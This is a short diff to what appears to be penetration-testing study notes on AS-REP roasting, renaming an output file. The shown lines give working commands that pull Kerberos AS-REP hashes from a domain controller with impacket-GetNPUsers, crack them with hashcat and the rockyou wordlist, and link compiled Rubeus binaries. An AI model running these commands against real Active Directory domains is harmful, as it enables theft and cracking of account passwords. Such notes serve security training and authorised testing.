@@ -32,8 +32,8 @@
 ## AS-REP Roasting
 - If without Kerberos pre-authN
 - Linux (Kali way) 
-1. ``` impacket-GetNPUsers -dc-ip {domain controller ip!!}  -request -outputfile {file name} corp.com/pete ``` Grap the AS-REP packet
-2. ``` sudo hashcat -m 18200 {file name} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -n 20 ``` 
+1. ``` impacket-GetNPUsers -dc-ip {domain controller ip!!}  -request -outputfile as-rep-roasted.txt corp.com/pete ``` Grap the AS-REP packet
+2. ``` sudo hashcat -m 18200 as-rep-roasted.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -n 20 ``` 
 
 - Windows (victim way)
 1. Rubeus: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
